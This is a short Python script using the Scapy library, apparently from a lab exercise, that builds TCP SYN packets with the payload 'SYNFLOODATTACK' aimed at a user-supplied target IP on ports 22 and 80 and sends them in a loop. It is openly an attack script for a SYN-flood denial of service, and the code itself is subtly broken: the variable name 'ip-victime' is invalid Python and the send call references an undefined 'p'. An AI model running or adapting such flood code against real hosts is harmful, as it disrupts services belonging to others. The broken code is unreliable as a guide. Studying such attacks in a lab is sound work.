#!/usr/bin/python

#Change log level to suppress annoying IPv6 error
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

#Import Scapy library
from scapy.all import *

ip-victime = raw_input('Please enter the IP address of the target (virtual machine) : ')

topt=[('Timestamp', (10,0))]
ip      = IP(dst=ip-victime, id=1111,ttl=99)
#TCP flag is set to  S value (SYN flag)
tcp     = TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S",options=topt)
#dummy data
payload = "SYNFLOODATTACK"

pkt     = ip/tcp/payload

#using a loop, we send out packets at 0.3 second intervals with a timeout of 4 seconds.

ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)


